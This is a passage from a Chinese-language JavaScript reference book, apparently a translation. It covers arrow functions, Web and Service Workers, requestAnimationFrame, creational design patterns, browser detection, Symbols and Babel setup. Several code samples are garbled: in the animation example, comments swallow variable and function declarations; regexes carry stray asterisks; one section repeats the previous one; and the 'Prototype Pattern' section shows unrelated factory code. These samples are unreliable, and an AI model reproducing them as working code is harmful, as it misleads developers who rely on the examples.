  \ 将指向所在作用域中的变量。\n\n```javascript\nconst arguments = [true];\nconst foo = x => console.log(arguments[0]);\n\
  foo(false); // -> true\n```\n\n由于此，箭头函数也无法感知其调用者/被调用（caller/callee）。\n\n虽然缺少 `arguments`\
  \ 对象在某些情况下是一个限制，但剩余参数（rest parameters）通常是很好的替代方案。\n\n```javascript\nconst arguments\
  \ = [true];\nconst foo = (...arguments) => console.log(arguments[0]);\nfoo(false);\
  \ // -> false\n```\n\n## 62.4 节：隐式返回\n\n如果函数体只包含单个表达式，箭头函数可以通过省略传统的包裹函数体的大括号来隐式返回值。\n\
  \n```javascript\nconst foo = () => \"moo\";\n```\n\n在使用隐式返回时，对象字面量必须封装在括号中，以防大括号被误认为是函数体。\n\
  \n```javascript\nconst foo = () => { bar: 1 } // foo() 返回 undefined\nconst foo =\
  \ () => ({ bar: 1 }) // foo() 返回 {bar: 1}\n```\n\n## 62.5 节：作为构造函数的箭头函数\n\n箭头函数在使用\
  \ `new` 关键字时会抛出 `TypeError`。\n\n```javascript\nconst foo = function () {\n  return\
  \ 'foo';\n}\nconst a = new foo();\n\nconst bar = () => {\n  return 'bar';\n}\nconst\
  \ b = new bar(); // -> Uncaught TypeError: bar is not a constructor\n```\n\n## 62.6\
  \ 节：显式返回\n\n箭头函数的行为与经典函数非常相似，你可以使用 `return` 关键字从它们中显式地返回值；只需用大括号包裹函数体，并返回一个值：\n\n\
  ```javascript\nconst foo = x => {\n  return x + 1;\n}\n```\n\n# 第 63 章：Workers\n\
  \n## 63.1 节：Web Worker\n\n\n\n\n\nWeb Worker 是一种在后台线程中运行脚本的简单方法，因为 线程可以执行任务（包括使用\
  \ `XMLHttpRequest` 的 I/O 任务），而不会干扰用户界面。一旦创建，worker 可以向创建它的 JavaScript 代码通过指定的事件处理器发送消息（通过发布消息），这些消息可以是不同数据类型（函数除外），反之亦然。\n\
  \n可以通过几种方式创建 Workers。\n\n最常见的方法是从一个简单的 URL：\n\n```javascript\nvar webworker = new\
  \ Worker(\"./path/to/webworker.js\");\n```\n\n也可以使用 `URL.createObjectURL()` 从字符串动态地创建一个\
  \ `Worker`：\n\n```javascript\nvar workerData = \"function someFunction() {}; console.log('More\
  \ code');\";\nvar blobURL = URL.createObjectURL(new Blob([\"(\" + workerData + \"\
  )\"], { type: \"text/javascript\" }));\nvar webworker = new Worker(blobURL);\n```\n\
  \n该方法还可以与 `Function.toString()` 结合，从现有函数创建 worker：\n\n```javascript\nvar workerFn\
  \ = function() {\n  console.log(\"I was run\");\n};\nvar blobURL = URL.createObjectURL(new\
  \ Blob([\"(\" + workerFn.toString() + \")\"], { type: \"text/javascript\" }));\n\
  var webworker = new Worker(blobURL);\n```\n\n### 章节 63.2: 一个简单的 service worker\n\
  \n`main.js`\n\nService worker 是一个针对源和路径注册的事件驱动 worker。它以 JavaScript 文件的形式存在，可以控制它关联的网页/网站，拦截并修改导航和资源请求，并以非常细粒度的方式缓存资源，让你能够完全控制应用在某些情况下的行为（最明显的情况是网络不可用时）。\n\
  \n来源：MDN\n\n**几点说明：**\n\n1. 它是一个 JavaScript `Worker`，所以它无法直接访问 DOM\n2. 它是一个可编程的网络代理\n\
  3. 它在不使用时会被终止，并在下次需要时重启\n4. Service worker 拥有与你的 web 页面完全分离的生命周期\n5. 需要 HTTPS\n\n\
  这段代码将在 `Document` 上文中执行，（或者）这段 JavaScript 将通过 `<script>` 标签包含在你的页面中。\n\n```javascript\n\
  // 检查浏览器是否支持 ServiceWorkers\nif ('serviceWorker' in navigator) {\n  navigator\n\
  \    .serviceWorker\n    .register(\n      // service worker 文件的路径\n      'sw.js'\n\
  \    )\n    // 注册是异步的，并返回一个 promise\n    .then(function (reg) {\n      console.log('Registration\
  \ Successful');\n    });\n}\n```\n\n`sw.js`\n\n这是 service worker 代码，在 `ServiceWorker`\
  \ 全局作用域中执行。\n\n```javascript\nself.addEventListener('fetch', function (event) {\n\
  \  // 这里什么都不做，只是记录所有的网络请求\n  console.log(event.request.url);\n});\n```\n\n### 章节\
  \ 63.3: 注册 service worker\n\n```javascript\n// 检查 service worker 是否可用\nif ('serviceWorker'\
  \ in navigator) {\n  navigator.serviceWorker.register('/sw.js').then(function(registration)\
  \ {\n    console.log('SW registration succeeded with scope:', registration.scope);\n\
  \  }).catch(function(e) {\n    console.log('SW registration failed with error:',\
  \ e);\n  });\n}\n```\n\n你可以在每次页面加载时调用 `register()`。如果 SW 已经注册，浏览器将为你提供一个已经在运行的实例。\n\
  \nSW 文件可以是任何名称。`sw.js` 是常见的命名。\n\nSW 文件的位置很重要，因为它定义了 SW 的作用范围（scope）。例如，位于 `/js/sw.js`\
  \ 的 SW 文件只能拦截以 `/js/` 开头的文件的 fetch 请求。由于因此，你通常会在项目的根目录下看到 SW 文件。\n\n### 章节 63.4:\
  \ 与 Web Worker 通信\n\n由于 workers 运行在与创建它们的不同线程中，因此通信需要通过 `postMessage` 完成。\n\n**注意：**\
  \ 由于导出前缀的不同，某些浏览器使用 `webkitPostMessage` 而不是 `postMessage`。你应该覆盖 `postMessage` 以确保\
  \ workers 在尽可能多的地方能够“工作”（此处并非双关）：\n\n```javascript\nworker.postMessage = (worker.webkitPostMessage\
  \ || worker.postMessage);\n```\n\n从主线程（父窗口）：\n\n```javascript\n// 创建一个 worker\n\
  var webworker = new Worker(\"./path/to/webworker.js\");\n\n// 向 worker 发送信息\nwebworker.postMessage(\"\
  Sample message\");\n\n// 监听来自 worker 的消息\nwebworker.addEventListener(\"message\"\
  , function(event) {\n  // `event.data` 包含从 worker 发送的值或对象\n  console.log(\"Message\
  \ from worker:\", event.data); // [\"foo\", \"bar\", \"baz\"]\n});\n```\n\n从 worker，在\
  \ `webworker.js` 中：\n\n```javascript\n// 向主线程（父窗口）发送信息\nself.postMessage([\"foo\"\
  , \"bar\", \"baz\"]);\n\n// 监听来自主线程的消息\nself.addEventListener(\"message\", function(event)\
  \ {\n  // `event.data` 包含从主线程发送的值或对象\nconsole.log(\"Message from parent:\", event.data);\
  \ // \"Sample message\"\n});\n```\n\n或者，你也可以使用 `onmessage` 添加事件监听：\n\n从主线程（父窗口）：\n\
  \n```javascript\nwebworker.onmessage = function(event) {\n  console.log(\"Message\
  \ from worker:\", event.data); // [\"foo\", \"bar\", \"baz\"]\n}\n```\n\n从 worker，在\
  \ `webworker.js` 中：\n\n```javascript\nself.onmessage = function(event) {\n  console.log(\"\
  Message from parent:\", event.data); // \"Sample message\"\n}\n```\n\n### 章节 63.5:\
  \ 终止 worker\n\n一旦完成对 worker 的使用，就应该终止它。这有助于为用户计算机上的其他应用程序释放资源。\n\n主线程：\n\n```javascript\n\
  // 从你的应用程序中终止 worker\nworker.terminate();\n```\n\n**注意：** `terminate` 方法不适用于 service\
  \ workers。它在不使用时会被终止，并在下次需要时重启。\n\nWorker 线程：\n\n```javascript\n// 让 worker 自身终止\n\
  self.close();\n```\n\n### 章节 63.6: 填充你的缓存\n\n在你的 service worker 注册后，浏览器将尝试安装并在稍后激活\
  \ service worker。\n\n**安装事件监听器**\n\n```javascript\nthis.addEventListener('install',\
  \ function(event) {\n  console.log('installed');\n});\n```\n\n**缓存**\n\n可以使用返回的\
  \ install 事件来缓存离线运行应用所需的资源。下面的示例使用了 cache api 来实现相同的操作。\n\n```javascript\nthis.addEventListener('install',\
  \ function(event) {\n  event.waitUntil(\n    caches.open('v1').then(function(cache)\
  \ {\n      return cache.addAll([\n        /* 所有需要缓存的资源数组 */\n        '/css/style.css',\n\
  \        '/js/app.js',\n        '/images/snowTroopers.jpg'\n      ]);\n    })\n\
  \  );\n});\n```\n\n### 章节 63.7: 专用 Workers 和共享 Workers\n\n#### 专用 Workers (Dedicated\
  \ Workers)\n\n专用 web worker 只能调用它的脚本访问。\n\n主应用：\n\n```javascript\nvar worker = new\
  \ Worker('worker.js');\nworker.addEventListener('message', function(msg) {\n  console.log('Result\
  \ from the worker:', msg.data);\n});\nworker.postMessage([2,3]);\n```\n\n`worker.js`：\n\
  \n```javascript\nself.addEventListener('message', function(msg) {\n  console.log('Worker\
  \ received arguments:', msg.data);\n  self.postMessage(msg.data[0] + msg.data[1]);\n\
  });\n```\n\n#### 共享 Workers (Shared Workers)\n\n共享 worker 可以被多个脚本访问——即使它们被不同的窗口、iframe\
  \ 甚至 workers 访问。\n\n创建共享 worker 与创建专用 worker 非常相似，但不是在主线程和 worker 线程之间进行直接通信，而是必须通过端口\
  \ 对象进行通信，即必须显式打开一个端口，以便多个脚本可以使用它与共享 worker 通信。（注意，专用 workers 是隐式完成此点的）\n\n主应用：\n\
  \n```javascript\nvar myWorker = new SharedWorker('worker.js');\nmyWorker.port.start();\
  \ // 打开端口连接\nmyWorker.port.postMessage([2,3]);\n```\n\n`worker.js`：\n\n```javascript\n\
  self.port.start(); // 打开端口连接以启用双向通信\n\nself.onconnect = function(e) {\n  var port\
  \ = e.ports[0]; // 获取端口\n  port.onmessage = function(e) {\n    console.log('Worker\
  \ received arguments:', e.data);\n    port.postMessage(e.data[0] + e.data[1]);\n\
  \  }\n};\n```\n\n\n\n\n\n请注意，在工作线程中设置此消息处理器也会隐式地打开返回父线程的端口连接，因此如上所述，实际上并不需要调用 `port.start()`。\n\
  \n## 第 64 章：requestAnimationFrame\n\n### 参数回调函数\n\n#### 详情\n\n“一个参数，用于指定在需要更新动画以进行下次重绘时调用的函数。”(https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)\n\
  \n### 第 64.1 节：使用 requestAnimationFrame 渐入元素\n\n查看 jsFiddle: https://jsfiddle.net/HimmatChahal/jb5trg67/\n\
  \n**复制并粘贴以下代码**：\n\n```html\n<html>\n<body>\n<h1><h1>这将以每秒 60 帧的速度渐入（或在你的硬件允许范围内尽可能接近的速度）</h1>\n\
  <script>\n// 在 2000 ms 内渐入 = 2 秒。\nvar FADE_DURATION = 2.0 * 1000;\n\n// -1 仅仅是一个标志位，用于指示我们是否正在渲染第\
  \ 1 帧 var startTime=-1.0;\n\n// 渲染当前帧（无论是哪一帧）的函数 render(currTime) {\nvar head1 =\
  \ document.getElementsByTagName('h1')[0];\n\n// head1 应该有多透明？它的渐入从 currTime=0 开始。\
  \ // 在 FADE_DURATION 毫秒内，不透明度从 0 变为 1 var opacity = (currTime/FADE_DURATION);\n\n\
  head1.style.opacity = opacity;\n}\n\n// 每个函数\nfunction eachFrame() {\n// 动画运行的时间（毫秒）\n\
  // 取消 console.log 函数的注释以查看\n// timeRunning 更新值的速度（可能会影响性能）\nvar timeRunning = (new\
  \ Date()).getTime() - startTime;\n//console.log('var timeRunning = '+timeRunning+'ms');\n\
  if (startTime < 0) {\n// 此分支：仅在第一帧时执行。 // 它设置了 startTime，然后在 currTime = 0.0 时渲染\
  \ startTime = (new Date()).getTime();\nrender(0.0);\n} else if (timeRunning < FADE_DURATION)\
  \ {\n// 此分支：渲染每一帧（第一帧除外）， // 使用新的 timeRunning 值。\nrender(timeRunning);\n} else {\n\
  return;\n}\n // 现在我们完成了一帧的渲染。\n// 所以我们向浏览器请求执行下一个 // 动画帧，浏览器会优化其余部分。 // 这发生得非常快，正如你在\
  \ console.log() 中看到的那样。window.requestAnimationFrame(eachFrame);\n};\n\n// 启动动画\n\
  window.requestAnimationFrame(eachFrame); \n</script>\n</body>\n</html>\n```\n\n\
  ### 第 64.2 节：保持兼容\n\n当然，就像浏览器 JavaScript 中的大多数事物一样，你不能指望所有内容在任何地方都都是相同的。在这种情况下，`requestAnimationFrame`\
  \ 在某些平台上可能带有前缀，并且命名不同，例如 `webkitRequestAnimationFrame`。幸运的是，有一种非常简单的方法可以将所有可能的差异归为一个函数：\n\
  \n```javascript\nwindow. requestAnimationFrame = (function(){ return window.requestAnimationFrame\
  \ || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(callback){\n\
  window.setTimeout(callback, 1000 / 60); });\n})();\n```\n\n注意，最后一个选项（当未发现现有支持时填充）不会返回一个可用于\
  \ `cancelAnimationFrame` 的 id。不过，已经编写了一个高效的补丁（polyfill）修复了这个问题。\n\n### 第 64.3 节：取消动画\n\
  \n要取消对 `requestAnimationFrame` 的调用，你需要它在最后一次调用时返回的 id。这就是你用于 `cancelAnimationFrame`\
  \ 的参数。下面的示例启动了一个假设的动画，然后在一秒后暂停它。\n\n```javascript\n// 存储每次调用 requestAnimationFrame\
  \ 返回的 id\nvar requestId;\n\n// 绘制某些内容\nfunction draw(timestamp) { \n// 执行一些动画\n\
  // 请求下一帧\nstart();\n}\n\n// 暂停动画\nfunction pause() {\n// 传入上次调用 requestAnimationFrame\
  \ 返回的 id\ncancelAnimationFrame(requestId);\n}\n\n// 启动动画\nfunction start() {\n//\
  \ 存储 requestAnimationFrame 返回的 id\nrequestId = requestAnimationFrame(draw); \n}\n\
  \n// ... 一秒后\nsetTimeout(pause, 1000);\n```\n\n## 第 65 章：创建模式\n\n### 设计模式\n\n设计模式是初始化对象的良好方式，而不是继承许多行为。以下是一些示例。\n\
  \n#### 65.1：工厂函数\n\n工厂函数简单来说就是一个返回对象的函数。工厂函数不需要 `new` 关键字，因此它们被用于创建对象。这是工厂函数最简单的形式，因为它允许我们隐藏实现细节并暴露我们想要使用的接口。\n\
  \n```javascript\nfunction cowFactory(name) {\n  function formalName() {\n    return\
  \ name;\n  }\n  return {\n    talk: function () {\n      console.log('Moo, name\
  \ is ' + formalName());\n    }\n  };\n}\n\nvar daisy = cowFactory('Daisy');\ndaisy.talk();\
  \ // Moo, name is\n```\n\n#### 65.2：带组合的工厂\n\n“组合优于继承”是一个重要且流行的编程原则，在 JavaScript\
  \ 中，通过工厂函数为对象分配行为。\n\n```javascript\nvar speaker = function (state) {\n  var noise\
  \ = state.noise || 'grunt';\n  return {\n    speak: function () {\n      console.log(state.name\
  \ + ' says ' + noise);\n    }\n  };\n};\n\nvar mover = function (state) {\n  return\
  \ {\n    moveSlowly: function () {\n      console.log(state.name + ' is moving slowly');\n\
  \    },\n    moveQuickly: function () {\n      console.log(state.name + ' is moving\
  \ quickly');\n    }\n  };\n};\n\nvar person = function (name, age) {\n  var state\
  \ = {\n    name: name,\n    age: age,\n    noise: 'Hello'\n  };\n  return Object.assign({},\n\
  \    speaker(state),\n    mover(state)\n  );\n};\n\nvar rabbit = function (name,\
  \ colour) {\n  var state = {\n    name: name,\n    colour: colour\n  };\n  return\
  \ Object.assign({},\n    mover(state)\n  );\n};\n\n// 使用\nvar fred = person('Fred',\
  \ 42);\nfred.speak(); // outputs: Fred says Hello\nfred.moveSlowly(); // outputs:\
  \ Fred is moving slowly\n\nvar snowy = rabbit('Snowy', 'white');\nsnowy.moveSlowly();\
  \ // outputs: Snowy is moving slowly\nsnowy.moveQuickly(); // outputs: Snowy is\
  \ moving quickly\nsnowy.speak(); // ERROR: snowy.speak is not a function\n```\n\n\
  #### 65.3：对象工厂\n\n对象工厂是在不使用 `new` 关键字的情况下创建对象的方法。在函数式编程中非常常见。\n\n```javascript\n\
  var person = function (name, age) {\n  var state = {\n    name: name,\n    age:\
  \ age,\n    noise: 'Hello'\n  };\n  return Object.assign({},\n    speaker(state),\n\
  \    mover(state)\n  );\n};\n\nvar rabbit = function (name, colour) {\n  var state\
  \ = {\n    name: name,\n    colour: colour\n  };\n  return Object.assign({},\n \
  \   mover(state)\n  );\n};\n\n// 使用\nvar fred = person('Fred', 42);\nfred.speak();\
  \ // outputs: Fred says Hello\nfred.moveSlowly(); // outputs: Fred is moving slowly\n\
  \nvar snowy = rabbit('Snowy', 'white');\nsnowy.moveSlowly(); // outputs: Snowy is\
  \ moving slowly\nsnowy.moveQuickly(); // outputs: Snowy is moving quickly\nsnowy.speak();\
  \ // ERROR: snowy.speak is not a function\n```\n\n#### 模块模式与暴露模块模式\n\n模块模式\n\n模块模式是一种创建和结构设计模式，提供了一种封装私有成员并产生公共\
  \ API 的方法。这通过创建一个立即调用函数表达式（IIFE）来实现，允许我们定义仅在该作用域内可见变量（通过闭包），同时返回一个包含公共 API 的对象。\n\
  \n```javascript\nvar Module = (function(*/* 如果需要传递初始化数据 */*) {\n```\n\n\n\n\n\n\
  ```javascript\n// 私有数据存储在闭包中\nvar privateData = 1;\n\n// 因为函数是立即调用的，\n// 返回值变成了公共\
  \ API\nvar api = {\n  getPrivateData : function() {\n    return privateData;\n \
  \ },\n  getDoublePrivateData : function() {\n    return api.getPrivateData() * 2;\n\
  \  }\n};\n\nreturn api;\n})(*/* 如果必要，传递初始化数据 */);\n```\n\n## 暴露模块模式 (Revealing Module\
  \ Pattern)\n\n暴露模块模式是模块模式（Module pattern）的一种变体。主要区别在于，所有成员（私有和公共）都定义在闭包内部，返回值是一个不包含函数定义的对象字面量，并且对成员数据的所有引用都是通过直接引用完成的，而不是通过返回的对象。\n\
  \n```javascript\nvar Module = (function(*/* 如果必要，传递初始化数据 */*) {\n  // 私有数据的存储方式和之前一样\n\
  \  var privateData = 1;\n\n  // 所有函数必须声明在返回的对象之外\n  var getPrivateData = function()\
  \ {\n    return privateData;\n  };\n\n  var getDoublePrivateData = function() {\n\
  \    // 直接引用闭包内的成员，而不是通过返回的对象\n    return getPrivateData() * 2;\n  };\n\n  // 返回一个不包含函数定义的对象字面量\n\
  \  return {\n    getPrivateData: getPrivateData,\n    getDoublePrivateData: getDoublePrivateData\n\
  \  };\n})(*/* 如果必要，传递初始化数据 */);\n```\n\n## 暴露原型模式 (Revealing Prototype Pattern)\n\
  \n这种模式的变体用于将构造函数与方法分离。这种模式允许我们像使用面向对象的语言一样使用 JavaScript：\n\n```javascript\n// 设置命名空间\n\
  var NavigationNs = NavigationNs || {};\n\n// 这被用类构造函数\nNavigationNs.active = function(current,\
  \ length) {\n  this.current = current;\n  this.length = length;\n}\n\n// 原型用于分离构造函数和方法\n\
  NavigationNs.active.prototype = function() {\n  // 这是一个公共方法的示例，因为它在返回语句中被暴露了\n \
  \ var setCurrent = function() {\n    // 这里变量 current 和 length 被用作私有类属性\n    for\
  \ (var i = 0; i < this.length; i++) {\n      $(this.current).addClass('active');\n\
  \    }\n  }\n  return { setCurrent: setCurrent };\n}();\n\n// 无参数构造函数的示例\nNavigationNs.pagination\
  \ = function() {}\n\nNavigationNs.pagination.prototype = function() {\n  // 这是一个私有方法的示例，因为它没有在返回语句中暴露\n\
  \  var reload = function(data) {\n    // 执行某些操作\n  },\n\n  // 它是唯一的公共方法，因为它是返回语句中引用的唯一函数\n\
  \  getPage = function(link) {\n    var a = $(link);\n    var options = {url: a.attr('href'),\
  \ type: 'get'}\n    $.ajax(options).done(function(data) {\n      // 在 ajax 调用完成后，调用私有方法\
  \ reload\n      reload(data);\n    });\n\n    return false;\n  }\n  return {getPage\
  \ : getPage}\n}();\n```\n\n上面的代码应该放在一个独立的 `.js` 文件中，以便在任何需要的页面中引用。可以这样使用：\n\n```javascript\n\
  var menuActive = new NavigationNs.active('ul.sidebar-menu li', 5);\nmenuActive.setCurrent();\n\
  ```\n\n### 第 65.4 节：原型模式 (Prototype Pattern)\n\n原型模式专注于创建一个对象，该对象可以通过原型继承作为其他对象的蓝图。这种模式在\
  \ JavaScript 中天生易于使用，因为 JS 原生支持原型继承，这意味着我们不需要花费时间或精力去模拟这种拓扑结构。\n\n#### 在原型上创建方法\n\
  \n```javascript\nfunction Car() {\n  this.name = \"Car\";\n  this.wheels = 4;\n\
  }\nfunction Truck() {\n  this.name = \"Truck\";\n  this.wheels = 6;\n}\nfunction\
  \ Bike() {\n  this.name = \"Bike\";\n  this.wheels = 2;\n}\n\nconst vehicleFactory\
  \ = {\n  createVehicle: function (type) {\n    switch (type.toLowerCase()) {\n \
  \     case \"car\":\n        return new Car();\n      case \"truck\":\n        return\
  \ new Truck();\n      case \"bike\":\n        return new Bike();\n      default:\n\
  \        return null;\n    }\n  }\n};\n```\n\n### 第 65.5 节：单例模式 (Singleton Pattern)\n\
  \n单例模式是一种限制类只能实例化一次的设计模式。在第一个对象创建后，每当调用时都会返回该对象的引用。\n\n```javascript\nvar Singleton\
  \ = (function () {\n  // instance 存储单例的引用\n  var instance;\n\n  function createInstance()\
  \ {\n    // 私有变量和方法\n    var _privateVariable = 'I am a private variable';\n\n \
  \   function _privateMethod() {\n      console.log('I am a private method');\n \
  \   }\n\n    return {\n      // 公共方法和变量\n      publicMethod: function() {\n    \
  \    console.log('I am a public method');\n      },\n      publicVariable: 'I am\
  \ a public variable'\n    };\n  }\n\n  return {\n    // 如果存在则获取单例，否则创建一个\n    getInstance:\
  \ function () {\n      if (!instance) {\n        instance = createInstance();\n\
  \      }\n      return instance;\n    }\n  };\n})();\n```\n\n**用法：**\n\n```javascript\n\
  // 不存在单例实例，它将创建一个\nvar instance1 = Singleton.getInstance();\n\n// 存在单例实例，它将返回该对象的引用\n\
  var instance2 = Singleton.getInstance();\n\nconsole.log(instance1 === instance2);\
  \ // true\n```\n\n### 第 65.6 节：抽象工厂模式 (Abstract Factory Pattern)\n\n抽象工厂模式是一种创建性设计模式，可以用于定义特定的实例或类，而无需指定正在创建的具体对象。\n\
  \n```javascript\nfunction Car() {\n  this.name = \"Car\";\n  this.wheels = 4;\n\
  }\nfunction Truck() {\n  this.name = \"Truck\";\n  this.wheels = 6;\n}\nfunction\
  \ Bike() {\n  this.name = \"Bike\";\n  this.wheels = 2;\n}\n\nconst vehicleFactory\
  \ = {\n  createVehicle: function (type) {\n    switch (type.toLowerCase()) {\n \
  \     case \"car\":\n        return new Car();\n      case \"truck\":\n        return\
  \ new Truck();\n      case \"bike\":\n        return new Bike();\n      default:\n\
  \        return null;\n    }\n  }\n};\n```\n\n\n\n\n\n```javascript\nconst car =\
  \ vehicleFactory.createVehicle(\"Car\"); // Car { name: \"Car\", wheels: 4 }\nconst\
  \ truck = vehicleFactory.createVehicle(\"Truck\"); // Truck { name: \"Truck\", wheels:\
  \ 6 }\nconst bike = vehicleFactory.createVehicle(\"Bike\"); // Bike { name: \"Bike\"\
  , wheels: 2 }\nconst unknown = vehicleFactory.createVehicle(\"Boat\"); // null (\
  \ Vehicle not known )\n```\n\n# 第 66 章：检测浏览器\n\n随着浏览器的演进，为 JavaScript 提供了更多功能。但这些功能并不在所有浏览器中都可用。有时，它们可能在某个浏览器中可用，但在其他浏览器中尚未发布。此外，这些功能在不同浏览器中的实现方式也不同。为了确保你开发的应用程序在不同的浏览器和设备上流畅运行，浏览器检测变得非常重要。\n\
  \n## 第 66.1 节：特性检测方法\n\n这种方法通过查找浏览器特定内容的是否存在。这种方法更难伪造，但不能保证对未来的兼容性。\n\n// Opera\
  \ 8.0+*\n\n```javascript\nvar isOpera = (!!window.opr && !!opr.addons) || !!window.opera\
  \ || navigator.userAgent.indexOf(' OPR/') >= 0;\n```\n\n// Firefox 1.0+*\n\n```javascript\n\
  var isFirefox = typeof InstallTrigger !== 'undefined';\n```\n\n// 至少 Safari 3+:\
  \ \"[object HTMLElementConstructor]\"\n\n```javascript\nvar isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor')\
  \ > 0;\n```\n\n// Internet Explorer 6-11\n\n```javascript\nvar isIE = /*@cc_on!@*/***false\
  \ || !!document.documentMode;\n```\n\n// Edge 20+*\n\n```javascript\nvar isEdge\
  \ = !isIE && !!window.StyleMedia;\n```\n\n// Chrome 1+*\n\n```javascript\nvar isChrome\
  \ = !!window.chrome && !!window.chrome.webstore;\n```\n\n// Blink 引擎检测\n\n```javascript\n\
  var isBlink = (isChrome || isOpera) && !!window.CSS;\n```\n\n在以下环境中通过测试：Firefox\
  \ 0.8 - 44, Chrome 1.0 - 48, Opera 8.0 - 34, Safari 3.0 - 9.0.3, IE 6 - 11, Edge\
  \ - 20-25\n\n感谢 Rob W\n\n## 第 66.2 节：User Agent 检测\n\n这种方法获取用户代理（user agent）并解析它以找到浏览器。通过正则表达式从\
  \ user agent 中提取浏览器名称和版本。基于这两点，返回 `<browser name> <version>`。\n\n用户 agent 匹配代码之后的四个条件块是为了考虑不同浏览器的\
  \ user agent 差异。例如，对于 Opera，由于它使用 Chrome 渲染引擎，因此额外增加了一个步骤来忽略该部分。\n\n注意，这种方法可以被用户轻松伪造。\n\
  \n```javascript\nnavigator.sayswho= (function(){\n  var ua= navigator.userAgent,\
  \ tem,\n  M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\\/))\\/?\\s*(\\\
  d+)/i*) || [];\n  if(/trident/i*.test(M[1])){\n    tem = /\\brv[ :]+(\\d+)/g*.exec(ua)\
  \ || [];\n    return 'IE '+(tem[1] || '');\n  }\n  if(M[1]=== 'Chrome'){\n    tem=\
  \ ua.match(/\\b(OPR|Edge)\\(\\d+)*/);\n    if(tem!= null) return tem.slice(1).join('\
  \ ').replace('OPR', 'Opera');\n  }\n  M= M[2]? [M[1], M[2]]: [navigator.appName,\
  \ navigator.appVersion, '-?'];\n  if((tem= ua.match(/version\\/(\\d+)/i*))!= null)\
  \ M.splice(1, 1, tem[1]);\n  return M.join(' ');\n})();\n```\n\n感谢 kennebec\n\n\
  ## 第 66.3 节：库方法\n\n对于某些人来说，更容易的方法是使用现有的 JavaScript 库。因为要保证浏览器检测准确性可能很困难，所以如果有现成的解决方案，使用它是有意义的。\n\
  \n流行的浏览器检测库是 Bowser。\n\n用法示例：\n\n```javascript\nif (bowser.msie && bowser.version\
  \ >= 6) {\n  alert('IE version 6 or newer');\n}\nelse if (bowser.firefox) {\n  alert('Firefox');\n\
  }\nelse if (bowser.chrome) {\n  alert('Chrome');\n}\nelse if (bowser.safari) {\n\
  \  alert('Safari');\n}\nelse if (bowser.iphone || bowser.android) {\n  alert('iPhone\
  \ or Android');\n}\n```\n\n# 第 67 章：符号 (Symbols)\n\n## 第 67.1 节：符号原始类型基础\n\nSymbol\
  \ 是 ES6 中的一种新原始类型。Symbol 主要用作属性键，其主要特征之一是唯一性，即使它们具有相同的描述。这意味着它们永远不会与任何其他 Symbol\
  \ 或字符串类型的属性键发生冲突。\n\n```javascript\nconst MY_PROP_KEY = Symbol();\nconst obj = {};\n\
  obj[MY_PROP_KEY] = \"ABC\";\nconsole.log(obj[MY_PROP_KEY]);\n```\n\n在此示例中，`console.log`\
  \ 的结果将是 ABC。\n\n你也可以拥有命名的 Symbol，例如：\n\n```javascript\nconst APPLE = Symbol('Apple');\n\
  const BANANA = Symbol('Banana');\nconst GRAPE = Symbol('Grape');\n```\n\n这些值中的每一个都是唯一的且无法被覆盖。\n\
  \n在创建原始符号时提供可选参数（描述）可以用于调试，但不能用于访问符号本身（但请参见 `Symbol.for()` 示例以获取注册/查找全局共享的方法）。\n\
  \n## 第 67.2 节：使用 Symbol.for() 创建全局共享符号\n\n`Symbol.for` 方法允许你通过名称注册和查找全局符号。当第一次使用给定键调用它时，它会创建一个新符号并将其添加到注册表中。\n\
  \n```javascript\nlet a = Symbol.for('A');\n```\n\n下次你调用 `Symbol.for('A')` 时，将返回相同的符号而不是新符号（与之相反，`Symbol('A')`\
  \ 会创建一个恰好具有相同描述的新的、符号的符号）。\n\n```javascript\na === Symbol.for('A') // true\n```\n\
  \n但是\n\n```javascript\na === Symbol('A') // false\n```\n\n## 第 67.3 节：将符号转换为字符串\n\
  \n与大多数其他对象不同，符号在执行拼接操作时不会自动转换为字符串。\n\n```javascript\nlet apple = Symbol('Apple')\
  \ + ''; // 抛出 TypeError!\n```\n\n相反，它们在需要时（例如为了获取符号的文本描述）必须使用 `toString` 方法或 `String`\
  \ 构造函数显式转换为字符串。\n\n```javascript\nconst APPLE = Symbol('Apple');\nlet str1 = APPLE.toString();\
  \ // \"Symbol(Apple)\"\nlet str2 = String(APPLE); // \"Symbol(Apple)\"\n```\n\n\
  # 第 68 章：编译 (Transpiling)\n\n编译是将解释特定语言并将其转换为目标语言的过程。\n\n## 第 68.1 节：编译简介\n\n编译是解释某些编程语言并将其转换为目标语言。在此语境下，编译将可以将编译成\
  \ JS 的语言进行翻译。\n\n示例\n\nES6/2015 转 ES5（通过 Babel）：\n\n这种 2015 语法\n\n//2015 箭头函数语法\n\
  ```javascript\n[1,2,3].map(n => n + 1);\n```\n\n被解释并翻译为这种 ES5 语法：\n\n// 传统的 ES5\
  \ 匿名函数\n```javascript\n[1,2,3].map(function(n) {\n  return n + 1;\n});\n```\n\n\
  CoffeeScript 转 JavaScript（通过内置 CoffeeScript 编译器）：\n\n这种 CoffeeScript\n\n# 存在：\n\
  ```javascript\nalert \"I knew it!\" if elvis?\n```\n\n被解释并翻译为 JavaScript：\n\n```javascript\n\
  if (typeof elvis !== \"undefined\" && elvis !== null) { alert(\"I knew it!\");\n\
  }\n```\n\n**我该如何编译？**\n\n大多数编译成 JavaScript 的语言都内置了编译器（例如 CoffeeScript 或 TypeScript）。在这种情况下，你可能只需要通过设置或复选框启用该语言的编译器。\n\
  \n**我为什么要编译？**\n\n经常提到的优点包括：\n\n可靠地使用新语法\n在大多数浏览器中的兼容性\n通过语言使用缺失或尚未原生的功能\n\n## 第\
  \ 68.2 节：开始使用 Babel 使用 ES6/7\n\n浏览器对 ES6 的支持不断增长，但为了确保你的代码可以在尚未完全支持它的环境中运行，可以使用\
  \ Babel 这种 ES6/7 转 ES5 的编译器，尝试一下吧！\n\n**使用 Babel 支持 ES6/7 的项目快速设置**\n\n1. 下载并安装\
  \ Node\n\n2. 进入文件夹并使用你喜爱的命令行工具创建项目\n\n```bash\n~ npm init\n```\n\n\n\n\n\n### 3.\
  \ 安装 Babel CLI\n\n```bash\nnpm install --save-dev babel-cli\nnpm install --save-dev\
  \ babel-preset-es2015\n```\n\n### 4. 创建一个 scripts 文件夹来存储你的 `.js` 文件，然后创建一个 `dist/scripts`\
  \ 文件夹用于存储转换后的完全兼容的文件。\n\n### 5. 在项目根目录下创建一个 `.babelrc` 文件，并写入以下内容：\n\n```json\n\
